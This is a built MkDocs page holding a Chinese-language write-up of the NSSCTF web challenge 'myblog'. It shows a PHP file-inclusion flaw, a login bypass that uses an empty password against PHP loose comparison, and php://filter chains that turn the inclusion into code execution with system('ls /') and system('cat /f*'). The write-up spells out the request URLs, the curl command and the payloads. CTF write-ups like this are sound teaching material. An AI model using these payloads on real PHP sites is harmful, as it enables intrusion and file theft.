@@ -1,0 +1,583 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://你的域名/docs/myblog/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>NSSCTF Web - myblog - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nssctf-web-myblog" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NSSCTF Web - myblog
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题型判断
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#page" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一步：确认 page 是文件包含
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第二步：读关键源码
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第三步：发现空密码登录绕过
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第四步：尝试上传链，发现不是最优解
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phptemp-phpfilter-lfi2rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第五步：转向 php://temp + php://filter 做 LFI2RCE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第六步：列出根目录，定位 flag 文件
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第七步：读取 flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        利用链总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        这题的核心知识点
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="nssctf-web-myblog">NSSCTF Web - myblog</h1>
+<h2 id="flag">Flag</h2>
+<p><code>NSSCTF{ec73ce41-a03d-4330-9c0e-092ad3d2cda6}</code></p>
+<h2 id="_1">题型判断</h2>
+<p>这题本质是 <code>page</code> 参数导致的 PHP 文件包含，核心利用点是 PHP 伪协议。</p>
+<p>从题目提示可以先想到两件事：</p>
+<ol>
+<li><code>Do you know the PHP pseudo-protocol?</code></li>
+<li><code>If you have something to empty...</code></li>
+<li><code>Learn more about PHP pseudo-protocol.</code></li>
+</ol>
+<p>第 1、3 条基本明示先看 <code>php://filter</code>。</p>
+<p>第 2 条的 <code>empty</code> 则是后面登录绕过的关键。</p>
+<h2 id="page">第一步：确认 <code>page</code> 是文件包含</h2>
+<p>访问首页：</p>
+<pre><code class="language-text">http://node4.anna.nssctf.cn:23764/index.php?page=home
+</code></pre>
+<p>再测试：</p>
+<pre><code class="language-text">http://node4.anna.nssctf.cn:23764/index.php?page=php://filter/read=convert.base64-encode/resource=login
+</code></pre>
+<p>页面直接回显了 <code>login.php</code> 的 base64 源码，说明这里是典型的包含点，而且 <code>php://filter</code> 可用。</p>
+<h2 id="_2">第二步：读关键源码</h2>
+<p>读到的关键源码有两处。</p>
+<p><code>login.php</code> 末尾：</p>
+<pre><code class="language-php">&lt;?php
+require_once(&quot;secret.php&quot;);
+mt_srand($secret_seed);
+$_SESSION['password'] = mt_rand();
+?&gt;
+</code></pre>
+<p><code>secret.php</code>：</p>
+<pre><code class="language-php">&lt;?php
+$secret_seed = mt_rand();
+?&gt;
+</code></pre>
+<p><code>admin/user.php</code> 前面的登录逻辑：</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+session_start();
+$logined = false;
+if (isset($_POST['username']) and isset($_POST['password'])){
+    if ($_POST['username'] === &quot;Longlone&quot; and $_POST['password'] == $_SESSION['password']){
+        $logined = true;
+        $_SESSION['status'] = $logined;
+    }
+}
+if ($logined === false &amp;&amp; !isset($_SESSION['status']) || $_SESSION['status'] !== true){
+    echo &quot;&lt;script&gt;alert('username or password not correct!');window.location.href='index.php?page=login';&lt;/script&gt;&quot;;
+    die();
+}
+?&gt;
+</code></pre>
+<h2 id="_3">第三步：发现空密码登录绕过</h2>
+<p>题目第二个提示说：</p>
+<pre><code class="language-text">If you have something to empty...
+</code></pre>
+<p>这里的关键在于：</p>
+<pre><code class="language-php">$_POST['password'] == $_SESSION['password']
+</code></pre>
+<p>这是弱比较。</p>
+<p>如果直接向 <code>admin/user</code> 发起登录请求，而不是先访问 <code>login.php</code>，那么当前 session 里根本没有初始化 <code>$_SESSION['password']</code>，它相当于 <code>NULL</code>。</p>
+<p>这时如果提交空密码：</p>
+<pre><code class="language-text">username=Longlone&amp;password=
+</code></pre>
+<p>则会触发：</p>
+<pre><code class="language-php">&quot;&quot; == NULL
+</code></pre>
+<p>弱比较结果为真，于是可以直接登录后台。</p>
+<p>验证请求：</p>
+<pre><code class="language-bash">curl -i -c cookie.txt -b cookie.txt -d &quot;username=Longlone&amp;password=&quot; &quot;http://node4.anna.nssctf.cn:23764/?page=admin/user&quot;
+</code></pre>
+<p>返回的是后台页面而不是报错，说明绕过成功。</p>
+<h2 id="_4">第四步：尝试上传链，发现不是最优解</h2>
+<p>后台里确实有文件上传点：</p>
+<pre><code class="language-php">if(isset($_FILES['Files']) and $_SESSION['status'] === true){
+    ...
+    move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name);
+}
+</code></pre>
+<p>我先测试过上传归档伪装图片，再尝试 <code>zip://</code> 包装器包含，但这条链没有顺利打通，像是目录或路径解析并不稳定。</p>
+<p>不过这一步不是必须的，因为题目真正的解法仍然围绕 PHP 伪协议。</p>
+<h2 id="phptemp-phpfilter-lfi2rce">第五步：转向 <code>php://temp</code> + <code>php://filter</code> 做 LFI2RCE</h2>
+<p>由于包含点会自动在参数后拼接 <code>.php</code>，普通 <code>data://</code>、上传文件包含都不够稳定。</p>
+<p>这时就要利用更经典的思路：</p>
+<pre><code class="language-text">php://filter/.../resource=php://temp
+</code></pre>
+<p><code>php://temp</code> 是“空流”，正好对应题目里的 <code>empty</code> 提示。</p>
+<p>再配合 filter chain，可以从空流里“构造”出任意 PHP 代码，最终达到代码执行。</p>
+<p>我本地使用 <code>php_filter_chain_generator.py</code> 生成 payload。</p>
+<p>先用最小代码验证是否执行成功：</p>
+<pre><code class="language-php">&lt;?=1;?&gt;
+</code></pre>
+<p>请求后页面回显了 <code>1</code>，说明 filter chain 执行链成立。</p>
+<h2 id="flag_1">第六步：列出根目录，定位 flag 文件</h2>
+<p>接着生成如下代码的 filter chain：</p>
+<pre><code class="language-php">&lt;?php system(&quot;ls /&quot;);die();?&gt;
+</code></pre>
+<p>请求后得到根目录列表：</p>
+<pre><code class="language-text">bin
+boot
+dev
+etc
+flllaggggggggg_isssssssssss_heeeeeeeeeere
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+run.sh
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre>
+<p>可以看到 flag 文件名是：</p>
+<pre><code class="language-text">/flllaggggggggg_isssssssssss_heeeeeeeeeere
+</code></pre>
+<h2 id="flag_2">第七步：读取 flag</h2>
+<p>为了缩短 payload，直接不用完整文件名，而是用通配：</p>
+<pre><code class="language-php">&lt;?php system(&quot;cat /f*&quot;);die();?&gt;
+</code></pre>
+<p>最终拿到：</p>
+<pre><code class="language-text">NSSCTF{ec73ce41-a03d-4330-9c0e-092ad3d2cda6}
+</code></pre>
+<h2 id="_5">利用链总结</h2>
+<ol>
+<li><code>page</code> 参数存在文件包含。</li>
+<li>用 <code>php://filter</code> 读取 <code>login.php</code>、<code>admin/user.php</code>、<code>secret.php</code> 源码。</li>
+<li>通过 <code>admin/user.php</code> 里的弱比较发现空密码绕过：<code>"" == NULL</code>。</li>
+<li>登录后台后继续分析，确认上传链不是最稳妥的主解。</li>
+<li>根据题目提示转向 <code>php://temp</code>。</li>
+<li>使用 <code>php://filter</code> filter chain 从空流构造 PHP 代码，实现 LFI2RCE。</li>
+<li><code>ls /</code> 找到异常命名的 flag 文件。</li>
+<li><code>cat /f*</code> 读取 flag。</li>
+</ol>
+<h2 id="_6">这题的核心知识点</h2>
+<p><code>php://filter</code></p>
+<p><code>php://temp</code></p>
+<p>PHP 弱比较</p>
+<p>LFI 到 RCE 的 filter chain 利用</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
